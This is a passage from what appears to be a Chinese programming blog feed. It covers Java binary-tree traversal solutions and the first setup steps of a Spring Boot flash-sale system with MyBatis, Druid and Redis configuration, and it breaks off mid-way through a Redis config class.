stack.push(<span class="hljs-keyword">new</span> ColorNode(root,<span class="hljs-string">&quot;white&quot;</span>));<br>        <br>        <span class="hljs-keyword">while</span>(!stack.empty())&#123;<br>            ColorNode cn = stack.pop();<br>            <br>            <span class="hljs-keyword">if</span>(cn.color.equals(<span class="hljs-string">&quot;white&quot;</span>))&#123;<br>                <span class="hljs-keyword">if</span>(cn.node.right != <span class="hljs-keyword">null</span>) stack.push(<span class="hljs-keyword">new</span> ColorNode(cn.node.right,<span class="hljs-string">&quot;white&quot;</span>));<br>                stack.push(<span class="hljs-keyword">new</span> ColorNode(cn.node,<span class="hljs-string">&quot;gray&quot;</span>));<br>                <span class="hljs-keyword">if</span>(cn.node.left != <span class="hljs-keyword">null</span>)stack.push(<span class="hljs-keyword">new</span> ColorNode(cn.node.left,<span class="hljs-string">&quot;white&quot;</span>));<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                res.add(cn.node.val);<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>不需要额外Class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        Deque&lt;Object&gt; stack = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>        LinkedList&lt;Integer&gt; res = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();<br>        <span class="hljs-keyword">if</span> (root == <span class="hljs-keyword">null</span>)<br>            <span class="hljs-keyword">return</span> res;<br>        stack.push(root);<br>        <span class="hljs-keyword">while</span> (!stack.isEmpty()) &#123;<br>            Object pop = stack.pop();<br>            <span class="hljs-keyword">if</span> (pop <span class="hljs-keyword">instanceof</span> Integer) &#123;<br>                res.addLast((Integer) pop);<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                TreeNode treeNode = (TreeNode) pop;<br>                <span class="hljs-keyword">if</span> (treeNode.right != <span class="hljs-keyword">null</span>) &#123;<br>                    stack.push(treeNode.right);<br>                &#125;<br>                stack.push(<span class="hljs-keyword">new</span> Integer(treeNode.val));<br>                <span class="hljs-keyword">if</span> (treeNode.left != <span class="hljs-keyword">null</span>) &#123;<br>                    stack.push(treeNode.left);<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="4-3-后序遍历"><a href="#4-3-后序遍历" class="headerlink" title="4.3 后序遍历"></a>4.3 后序遍历</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Solution</span> </span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ColorNode</span> </span>&#123;<br>        TreeNode node;<br>        String color;<br>        <br>        <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ColorNode</span><span class="hljs-params">(TreeNode node,String color)</span></span>&#123;<br>            <span class="hljs-keyword">this</span>.node = node;<br>            <span class="hljs-keyword">this</span>.color = color;<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Integer&gt; <span class="hljs-title">inorderTraversal</span><span class="hljs-params">(TreeNode root)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ArrayList&lt;Integer&gt;();<br>            <br>        List&lt;Integer&gt; res = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>        Stack&lt;ColorNode&gt; stack = <span class="hljs-keyword">new</span> Stack&lt;&gt;();<br>        stack.push(<span class="hljs-keyword">new</span> ColorNode(root,<span class="hljs-string">&quot;white&quot;</span>));<br>        <br>        <span class="hljs-keyword">while</span>(!stack.empty())&#123;<br>            ColorNode cn = stack.pop();<br>            <span class="hljs-keyword">if</span>(cn.color.equals(<span class="hljs-string">&quot;white&quot;</span>))&#123;<br>                stack.push(<span class="hljs-keyword">new</span> ColorNode(cn.node,<span class="hljs-string">&quot;gray&quot;</span>));<br>                <span class="hljs-keyword">if</span>(cn.node.right != <span class="hljs-keyword">null</span>) stack.push(<span class="hljs-keyword">new</span> ColorNode(cn.node.right,<span class="hljs-string">&quot;white&quot;</span>));<br>                <span class="hljs-keyword">if</span>(cn.node.left != <span class="hljs-keyword">null</span>)stack.push(<span class="hljs-keyword">new</span> ColorNode(cn.node.left,<span class="hljs-string">&quot;white&quot;</span>));<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                res.add(cn.node.val);<br>            &#125;<br>        &#125;<br>        <br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="5-层序遍历"><a href="#5-层序遍历" class="headerlink" title="5. 层序遍历"></a>5. 层序遍历</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span>[] levelOrder(TreeNode root) &#123;<br>    <span class="hljs-comment">//利用队列的先进先出特性</span><br>    <span class="hljs-keyword">if</span>(root == <span class="hljs-keyword">null</span>)&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[<span class="hljs-number">0</span>];<br>    &#125;<br>    Queue&lt;TreeNode&gt; queue = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;()&#123;&#123;add(root);&#125;&#125;;<br>    ArrayList&lt;Integer&gt; ans = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();<br>    <span class="hljs-keyword">while</span> (!queue.isEmpty())&#123;<br>        TreeNode treeNode = queue.poll();<br>        ans.add(treeNode.val);<br>        <span class="hljs-keyword">if</span> (treeNode.left != <span class="hljs-keyword">null</span>)&#123;<br>            queue.add(treeNode.left);<br>        &#125;<br>        <span class="hljs-keyword">if</span> (treeNode.right != <span class="hljs-keyword">null</span>)&#123;<br>            queue.add(treeNode.right);<br>        &#125;<br><br>    &#125;<br>    <span class="hljs-keyword">int</span>[] res = <span class="hljs-keyword">new</span> <span class="hljs-keyword">int</span>[ans.size()];<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;i &lt; ans.size();i++)&#123;<br>        res[i] = ans.get(i);<br>    &#125;<br>    <span class="hljs-keyword">return</span> res;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">二叉树相关的算法题离不开遍历，这里总结递归遍历，非递归遍历，层序遍历，Mirrors遍历，颜色标记法等方式。</summary>
    
    
    
    <category term="算法" scheme="http://example.com/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="算法" scheme="http://example.com/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="二叉树" scheme="http://example.com/tags/%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>Java秒杀系统</title>
    <link href="http://example.com/2021/01/28/Java%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F/"/>
    <id>http://example.com/2021/01/28/Java%E7%A7%92%E6%9D%80%E7%B3%BB%E7%BB%9F/</id>
    <published>2021-01-28T13:35:25.000Z</published>
    <updated>2021-01-28T13:37:14.199Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-项目框架搭建"><a href="#1-项目框架搭建" class="headerlink" title="1. 项目框架搭建"></a>1. 项目框架搭建</h1><h2 id="1-1-配置SpringBoot"><a href="#1-1-配置SpringBoot" class="headerlink" title="1.1 配置SpringBoot"></a>1.1 配置SpringBoot</h2><p>引入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-web<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-thymeleaf<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>编写启动类（放在与其它包同名目录下）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@SpringBootApplication</span><span class="hljs-comment">// same as @Configuration @EnableAutoConfiguration @ComponentScan</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MainApplication</span> </span>&#123;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        SpringApplication.run(MainApplication.class,args);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写controller</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;/demo&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SampleController</span> </span>&#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    UserService userService;<br><br>    <span class="hljs-meta">@Autowired</span><br>    RedisService redisService;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/thymeleaf&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">thymeleaf</span><span class="hljs-params">(Model model)</span></span>&#123;<br>        model.addAttribute(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;shuaiyun&quot;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hello&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/db/get&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;User&gt; <span class="hljs-title">dbGet</span><span class="hljs-params">()</span></span>&#123;<br>        User user = userService.getById(<span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> Result.success(user);<br>    &#125;<br><br>    <span class="hljs-meta">@RequestMapping(&quot;/redis/get&quot;)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Result&lt;User&gt; <span class="hljs-title">redisGet</span><span class="hljs-params">()</span></span>&#123;<br>        redisService.get<br>        <span class="hljs-keyword">return</span> Result.success(user);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写service</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Service</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserService</span> </span>&#123;<br><br>    <span class="hljs-meta">@Autowired</span><br>    UserDao userDao;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">getById</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span></span>&#123;<br>        <span class="hljs-keyword">return</span> userDao.getById(id);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>编写dao</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Mapper</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserDao</span> </span>&#123;<br><br>    <span class="hljs-meta">@Select(&quot;select * from user where id = #&#123;id&#125;&quot;)</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> User <span class="hljs-title">getById</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="1-2-配置Mybatis"><a href="#1-2-配置Mybatis" class="headerlink" title="1.2 配置Mybatis"></a>1.2 配置Mybatis</h2><p>引入依赖：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.mybatis.spring.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mybatis-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>mysql<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>mysql-connector-java<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>druid-spring-boot-starter<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.10<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>配置文件</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment"># mybatis</span><br><span class="hljs-meta">mybatis.type-aliases-package</span>=<span class="hljs-string">com.mooc.miaosha.domain</span><br><span class="hljs-meta">mybatis.configuration.map-underscore-to-camel-case</span>=<span class="hljs-string">true</span><br><span class="hljs-meta">mybatis.configuration.default-fetch-size</span>=<span class="hljs-string">100</span><br><span class="hljs-meta">mybatis.configuration.default-statement-timeout</span>=<span class="hljs-string">3000</span><br><span class="hljs-meta">mybatis.mapperLocations</span> = <span class="hljs-string">classpath:com/mooc/miaosha/dao/*.xml</span><br><span class="hljs-comment"># druid</span><br><span class="hljs-meta">spring.datasource.url</span>=<span class="hljs-string">jdbc:mysql://localhost:3306/miaosha?useUnicode=true&amp;characterEncoding=utf-8&amp;allowMultiQueries=true&amp;useSSL=false</span><br><span class="hljs-comment">#spring.datasource.url=jdbc:mysql://192.168.120.7:3306/miaosha?useUnicode=true&amp;characterEncoding=utf-8&amp;allowMultiQueries=true&amp;useSSL=false</span><br><span class="hljs-meta">spring.datasource.druid.username</span>=<span class="hljs-string">root</span><br><span class="hljs-meta">spring.datasource.druid.password</span>=<span class="hljs-string">shuaiyun</span><br><span class="hljs-meta">spring.datasource.druid.driver-class-name</span>=<span class="hljs-string">com.mysql.jdbc.Driver</span><br><span class="hljs-meta">spring.datasource.type</span>=<span class="hljs-string">com.alibaba.druid.pool.DruidDataSource</span><br><span class="hljs-meta">spring.datasource.druid.filters</span>=<span class="hljs-string">stat</span><br><span class="hljs-meta">spring.datasource.druid.max-active</span>=<span class="hljs-string">100</span><br><span class="hljs-meta">spring.datasource.druid.initial-size</span>=<span class="hljs-string">50</span><br><span class="hljs-meta">spring.datasource.druid.max-wait</span>=<span class="hljs-string">60000</span><br><span class="hljs-meta">spring.datasource.druid.min-idle</span>=<span class="hljs-string">1</span><br><span class="hljs-meta">spring.datasource.druid.time-between-eviction-runs-millis</span>=<span class="hljs-string">60000</span><br><span class="hljs-meta">spring.datasource.druid.min-evictable-idle-time-millis</span>=<span class="hljs-string">300000</span><br><span class="hljs-meta">spring.datasource.druid.validation-query</span>=<span class="hljs-string">select &#x27;x&#x27;</span><br><span class="hljs-meta">spring.datasource.druid.test-while-idle</span>=<span class="hljs-string">true</span><br><span class="hljs-meta">spring.datasource.druid.test-on-borrow</span>=<span class="hljs-string">false</span><br><span class="hljs-meta">spring.datasource.druid.test-on-return</span>=<span class="hljs-string">false</span><br><span class="hljs-meta">spring.datasource.druid.pool-prepared-statements</span>=<span class="hljs-string">true</span><br><span class="hljs-meta">spring.datasource.druid.max-open-prepared-statements</span>=<span class="hljs-string">20</span><br></code></pre></td></tr></table></figure><p>在dao中使用注解</p><h2 id="1-3-配置Redis"><a href="#1-3-配置Redis" class="headerlink" title="1.3 配置Redis"></a>1.3 配置Redis</h2><p>在centos上安装redis</p><p>先跳转到相应目录</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/usr/</span>leyou<span class="hljs-regexp">/redis/</span>bin<br></code></pre></td></tr></table></figure><p>以指定配置文件启动：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-function"><span class="hljs-title">redis</span></span>-server ../redis.conf<br></code></pre></td></tr></table></figure><p>若没有密码可设置密码</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs awk">客户端登录：<br>redis-cli<br>客户端使用config get requirepass命令查看密码：<br>config get requirepass<br>客户端使用config set requirepass yourpassword命令设置密码：<br>config set requirepass <span class="hljs-number">123456</span><br>进入utils文件夹运行install_server.sh分别配置启动文件，日志文件，数据存放目录：<br><span class="hljs-regexp">/usr/</span>leyou<span class="hljs-regexp">/redis/</span>redis.conf<br><span class="hljs-regexp">/usr/</span>leyou<span class="hljs-regexp">/redis/</span>redis.log<br><span class="hljs-regexp">/usr/</span>leyou<span class="hljs-regexp">/redis/</span>data<br></code></pre></td></tr></table></figure><p>引入jedis和fastjson依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>redis.clients<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jedis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.9.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.alibaba<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>fastjson<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.2.38<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>配置文件</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-comment">##redis</span><br><span class="hljs-meta">redis.host</span>=<span class="hljs-string">192.168.120.7</span><br><span class="hljs-meta">redis.port</span>=<span class="hljs-string">6379</span><br><span class="hljs-meta">redis.password</span>=<span class="hljs-string">123456</span><br><span class="hljs-meta">redis.timeout</span>=<span class="hljs-string">100</span><br><span class="hljs-meta">redis.poolMaxTotal</span>=<span class="hljs-string">1000</span><br><span class="hljs-meta">redis.poolMaxIdle</span>=<span class="hljs-string">500</span><br><span class="hljs-meta">redis.poolMaxWait</span>=<span class="hljs-string">500</span><br></code></pre></td></tr></table></figure><p>教程的配置文件如上，但会报错</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">redis<span class="hljs-selector-class">.clients</span><span class="hljs-selector-class">.jedis</span><span class="hljs-selector-class">.exceptions</span><span class="hljs-selector-class">.JedisConnectionException</span>: Could not get <span class="hljs-selector-tag">a</span> resource from the pool<br>at redis<span class="hljs-selector-class">.clients</span><span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.Pool</span>.getResource(Pool<span class="hljs-selector-class">.java</span>:<span class="hljs-number">22</span>)<br>at Workers<span class="hljs-selector-class">.Worker1</span>.met1(Worker1<span class="hljs-selector-class">.java</span>:<span class="hljs-number">124</span>)<br>at Workers<span class="hljs-selector-class">.Worker1</span>.work(Worker1<span class="hljs-selector-class">.java</span>:<span class="hljs-number">108</span>)<br>at org<span class="hljs-selector-class">.gearman</span><span class="hljs-selector-class">.impl</span><span class="hljs-selector-class">.worker</span>.WorkerConnectionController$<span class="hljs-number">3</span>.run(Unknown Source)<br>at java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.concurrent</span><span class="hljs-selector-class">.ThreadPoolExecutor</span>.runWorker(Unknown Source)<br>at java<span class="hljs-selector-class">.util</span><span class="hljs-selector-class">.concurrent</span>.ThreadPoolExecutor<span class="hljs-variable">$Worker</span>.run(Unknown Source)<br>at java<span class="hljs-selector-class">.lang</span><span class="hljs-selector-class">.Thread</span>.run(Unknown Source)  <br></code></pre></td></tr></table></figure><p>并且properties文件提示无法解析，修改为：</p><figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-meta">spring.redis.host</span>=<span class="hljs-string">192.168.120.7</span><br><span class="hljs-meta">spring.redis.port</span>=<span class="hljs-string">6379</span><br><span class="hljs-meta">spring.redis.password</span>=<span class="hljs-string">123456</span><br><span class="hljs-meta">spring.redis.timeout</span>=<span class="hljs-string">100</span><br><span class="hljs-meta">spring.redis.poolMaxTotal</span>=<span class="hljs-string">1000</span><br><span class="hljs-meta">spring.redis.poolMaxIdle</span>=<span class="hljs-string">500</span><br><span class="hljs-meta">spring.redis.poolMaxWait</span>=<span class="hljs-string">500</span><br></code></pre></td></tr></table></figure><p>编写配置类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Component</span><br><span class="hljs-meta">@ConfigurationProperties(prefix = &quot;spring.redis&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">RedisConfig</span> </span>&#123;<br><br>    <span class="hljs-keyword">private</span> String host;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> port;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> timeout;<br>    <span class="hljs-keyword">private</span> String password;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> poolMaxTotal;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> poolMaxIdle;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> poolMaxWait;<br>    <span 